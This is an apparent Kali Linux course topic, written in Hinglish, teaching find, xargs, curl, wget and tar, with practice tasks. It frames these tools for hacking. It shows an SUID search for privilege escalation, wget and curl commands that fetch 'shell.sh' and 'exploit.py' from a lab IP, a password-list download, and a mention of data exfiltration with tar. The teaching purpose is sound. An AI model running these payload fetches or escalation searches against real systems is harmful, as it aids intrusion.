---
title: "Topic 41 - Advanced Unix Utilities (find, xargs, curl, wget, tar)"
tags:
  - kali-linux
  - cybersecurity
  - learning-session
type: course-topic
---

← [[Course on Kali Linux|Go Back to Course Hub]]

# 🛠️ Topic 41: Advanced Unix Utilities (find, xargs, curl, wget, tar)

Bhai, Linux me efficiency badhane aur complex tasks ko automate karne ke liye hum standard **Unix Utilities** ka use karte hain. Hacking operations me target systems par payload download karna, SUID files dhoondhna, exfiltrated data ko compression format me archive karna, aur commands ko automate karna in tools ke bina impossible hai.

Chalo in 5 sabse powerful Unix utilities ko deeply samajhte hain.

---

### ⚙️ Core Unix Tools

#### 1. `find` (Files & Permissions Dhoondhna) 🔍
Yeh system me kisi bhi criteria ke basis par files search karne ka ultimate tool hai.
* **Naam se dhoondhna:**
  ```bash
  find /home -name "flag.txt"
  ```
* **Size ke basis par dhoondhna (+10MB se badi files):**
  ```bash
  find /var -size +10M
  ```
* **💀 Cybersecurity Privilege Escalation vector (SUID Files Search):**
  Hacker root access paane ke liye aisi files dhoondhta hai jinhe normal user chalaye toh wo root rights ke sath execute hon:
  ```bash
  find / -perm -4000 -type f 2> /dev/null
  ```
  *(Yahan `2> /dev/null` lagaya hai taaki permission errors chup jayein aur sirf direct SUID files hi dikhein).*

---

#### 2. `xargs` (Chained Command Arguments builder) 🔗
`xargs` piping (`|`) ke data stream ko standard arguments me convert karta hai. Agar kisi command ka output standard input (`stdin`) accept nahi karta, toh hum uske pehle `xargs` lagate hain.
* *Example (Sare `.log` files dhoondh kar ek baar me delete karna):*
  ```bash
  find . -name "*.log" | xargs rm
  ```
  *(Yahan `find` ne log paths dhoondhe aur `xargs` ne un saare paths ko `rm` ke arguments ke roop me redirect kar diya).*

---

#### 3. `curl` & `wget` (Downloading from Web) 📥
Terminal se internet se files, tools, aur payloads download karne ke liye ye dono utility use hoti hain:
* **`wget` (Direct Downloader):** Ye file ko direct download karke locally save karta hai.
  ```bash
  wget http://10.10.10.5/shell.sh
  ```
* **`curl` (Client URL Transfer):** By default, `curl` file ko terminal par print karta hai. Ise save karne ke liye **`-o` (output)** lagana parta hai:
  ```bash
  curl -o exploit.py http://10.10.10.5/exploit.py
  ```

---

#### 4. `tar` (Tape Archive & Compression) 📦
Multiple files ko ek single compressed packet (`.tar` ya `.tar.gz`) me pack karne ke liye `tar` use hota hai:
* **`-c`**: Create archive (Naya compress file banana).
* **`-x`**: Extract archive (Khoolna).
* **`-v`**: Verbose (Screen par files dikhana).
* **`-f`**: File name specify karna.
* **`-z`**: Gzip compression enable karna (size chota karne ke liye).
* *Example (Compress a directory to `.tar.gz`):*
  ```bash
  tar -czvf backup.tar.gz /home/kali/projects/
  ```
* *Example (Extract a compressed file):*
  ```bash
  tar -xzvf backup.tar.gz
  ```

---

### 🔑 Real-World Analogy (The Logistics Agent 📦📦)
Maan lo aap ek import-export agency chala rahe ho:
* **`find` (The Detective):** Poore warehouse me specific requirements (jaise "+10 kg size" ya "red color tag") ka dabba dhoondh nikalna.
* **`xargs` (The Hand-over Loader):** Detective ke dhoondhe gaye dabbon ko uthakar sidhe trash trucks (rm command) ke load bay me arguments ki tarah dump kar dena.
* **`curl` / `wget` (The Import Courier):** Kisi doosre desh (server/website) se direct parcel (payload/script) download karke warehouse me manga lena.
* **`tar` (The Shrink-wrap Packer):** 100 chote packets ko ek sath tape se pack karke vacuum plastic (`-z`) se chota block bana dena taaki transport karne me aasaani ho.

---

### 📝 10 Practice Questions/Tasks for You!

Bhai, in advance Unix utilities ko test karne ke liye in tasks ko terminal par execute karein:

1. **Task 1:** Apne system me `/etc` directory ke andar `.conf` extensions wali sabhi files dhoondhne ke liye `find /etc -name "*.conf"` run karein.
2. **Task 2:** Apne home folder me files dhoondhein jo **large size** (+1MB) ki hain: `find ~ -type f -size +1M`.
3. **Task 3:** normal terminal status se errors ko hide karte hue systems me SUID files search syntax `find /usr/bin -perm -4000 -type f 2> /dev/null` ka list verify karein.
4. **Task 4:** 3 test log files banayein (`error_1.log`, `error_2.log`, `error_3.log`), aur fir `find . -name "error_*.log" | xargs rm` pipe chala kar ek bar me saaf karein.
5. **Task 5:** Internet connectivity check karne aur raw Google home page HTML output terminal screen par fetch karne ke liye `curl https://www.google.com` run karein.
6. **Task 6:** Hacking scripts fetch karne ka simulation check karein: `wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt` chala kar aadhi password list local download test karein.
7. **Task 7:** Ek naya folder banayein `archive_test/`, usme 2 blank text files touch karein, aur use `.tar` packaging format me compile karein (`tar -cvf test.tar archive_test/`).
8. **Task 8:** `.tar` file ko heavy gzip compression lagakar `.tar.gz` archive compile karne ke liye `tar -czvf test.tar.gz archive_test/` run karein aur verify karein.
9. **Task 9:** Compressed `.tar.gz` package extract extraction verification ke liye `tar -xzvf test.tar.gz` run karein.
10. **Task 10:** Cybersecurity operations and data exfiltration pipelines me `tar` aur `find` commands ke dynamic combinations kaise use hote hain? Short point out karein.

---
